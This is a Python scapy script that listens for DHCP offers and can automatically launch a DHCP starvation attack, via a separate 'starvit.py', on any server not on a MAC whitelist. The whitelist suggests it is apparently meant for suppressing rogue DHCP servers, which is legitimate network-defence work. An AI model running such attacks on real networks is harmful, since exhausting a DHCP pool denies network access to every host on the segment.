#!/usr/bin/env python3

# suppress "WARNING: No route found for IPv6 destination :: (no default route?)"
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import os

from scapy.all import *
from arp_ping import get_mac
# def show_dhcpoffer(pkt):

global _DEBUG, see_all, dhcp_whitelist, starvation_on

# it need a dynamic CIDR diagnosys
def starvation_attack(network='192.168.0.1/24', 
                      dst_mac='ff:ff:ff:ff:ff:ff'):
    cmd = ' '.join(['python3', 
                     'starvit.py',
                     '-i {}'.format(conf.iface),
                     '-net {}'.format(network),
                     '-dst_mac {}'.format(dst_mac)])
    print('** '+ cmd)
    proc = subprocess.Popen(cmd,
                             shell=True,
                             stdout=subprocess.PIPE)

def pkt_callback(pkt):
    """
    dhcp message type:
        1 : dhcp discover
        2 : dhcp offer
        
        3 : request
        5 : request ?
        
        6 : nak
    pkt.lastlayer().fields['options'][0] is 'message-type'
    """
    
    if _DEBUG: 
        pkt.show() # debug statement
        print(pkt.lastlayer().fields['options'])
    
    if pkt.lastlayer().fields['options'][0][1] == 2:
        router_ip = pkt.lastlayer().fields['options'][7][1] 
        print("DHCP OFFER from: {} [{}]".format(router_ip, get_mac(router_ip, conf.iface)))
        target_host = get_mac(router_ip, conf.iface)
        if starvation_on and target_host not in dhcp_whitelist:
            target_net = router_ip+'/24'
            print("starting starvation on {}, {}".format(target_host, target_net))
            starvation_attack(network=target_net, dst_mac=target_host)
    if see_all:
        if pkt.lastlayer().fields['options'][0][1] == 3:
            router_ip = pkt.fields.get('src')
            print ('DHCP REQUEST from %s' % router_ip)
        elif pkt.lastlayer().fields['options'][0][1] == 6:
            router_ip = pkt.lastlayer().fields['options'][1][1] 
            print ("DHCP NAK from: {} [{}]".format(router_ip, get_mac(router_ip, conf.iface)))
    
def listen(iface, pfilter):
    # store argument must be set to 0 for the prn callback to be invoked
    sniff(iface=iface, filter=pfilter, prn=pkt_callback, store=0)

if __name__=="__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', required=True, 
                        help="interface to start listen to")

    parser.add_argument('-starvation-attack', 
                        required=False, action="store_true", 
                        help="if enabled it will start a starvation on every DHCP-OFFER sniffed")

    parser.add_argument('-starvation-exclude', required=False, 
                        nargs='+', 
                        # default=[
                                 # '192.168.0.0/16', 
                                 # '172.16.0.0/12',
                                 # '10.0.0.0/8'],
                        help=("DHCP macaddress to be whitelisted divided by space "
                              # "defaults are listed in RFC 1918 - "
                              # "Address Allocation for Private Internets \n"
                              "example: "
                              "08:00:27:7c:f9:41 00:00:27:1c:f9:41"))

    parser.add_argument('-pfilter', required=False, default='port 68 and port 67',
                        help="filter")

    parser.add_argument('-all', required=False, action="store_true", 
                        help="listen for REQUEST and NAK too")

    parser.add_argument('-debug', required=False, action="store_true", 
                        help="interface to start listen to")

    args = parser.parse_args()
    
    print ("Start DHCP listener on interface '%s' with filter '%s'" % (args.i, args.pfilter))
    # run!
    
    _DEBUG = args.debug
    conf.iface = args.i
    see_all = args.all

    starvation_on = args.starvation_attack
    dhcp_whitelist = args.starvation_exclude
    
    listen(args.i,
           args.pfilter)
